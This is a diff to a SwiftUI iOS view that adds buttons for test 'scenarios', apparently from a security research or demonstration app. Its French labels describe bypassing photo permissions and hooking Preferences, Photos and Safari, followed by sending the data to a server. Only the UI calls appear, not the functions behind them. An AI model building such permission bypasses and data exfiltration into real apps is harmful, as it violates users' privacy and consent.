@@ -10,6 +10,8 @@ import SwiftUI
 struct ContentView: View {
     @AppStorage("isEvil") var isEvil: Bool = false
     @AppStorage("stayalivev2") var stayalivev2: Bool = false
+    @AppStorage("photoAccess") var photoAccess: Bool = false
+    @AppStorage("systemHook") var systemHook: Bool = false
     
     init() {
         EvilFind()
@@ -41,6 +43,44 @@ struct ContentView: View {
                         isEvil = !isEvil
                     }
                     .foregroundColor(isEvil ? .red : .blue)
+                }
+                Section(header: Text("Photo Access (Scénario 3)"),
+                        footer: Text("Tente d'accéder aux photos en bypassant les permissions")) {
+                    Button(photoAccess ? "Stop Photo Monitoring" : "Start Photo Monitoring") {
+                        if !photoAccess {
+                            startPhotoMonitoring()
+                        }
+                        photoAccess = !photoAccess
+                    }
+                    .foregroundColor(photoAccess ? .red : .green)
+                    
+                    Button("Test Photo Access") {
+                        if bypassPhotoAccess() {
+                            sendPhotoInfoToServer()
+                        }
+                    }
+                    .disabled(photoAccess)
+                }
+                Section(header: Text("System Hook"),
+                        footer: Text("Tente d'hook des apps système pour accéder aux APIs")) {
+                    Button(systemHook ? "Stop System Monitoring" : "Start System Monitoring") {
+                        if !systemHook {
+                            startSystemMonitoring()
+                        }
+                        systemHook = !systemHook
+                    }
+                    .foregroundColor(systemHook ? .red : .green)
+                    
+                    Button("Test System Hook") {
+                        let systemApps = ["com.apple.Preferences", "com.apple.Photos", "com.apple.mobilesafari"]
+                        for app in systemApps {
+                            if hookSystemApp(app) {
+                                sendSystemInfoToServer()
+                                break
+                            }
+                        }
+                    }
+                    .disabled(systemHook)
                 }
                 Section(header: Text("App life cycle"),
                         footer: Text("Restarts the app.")) {
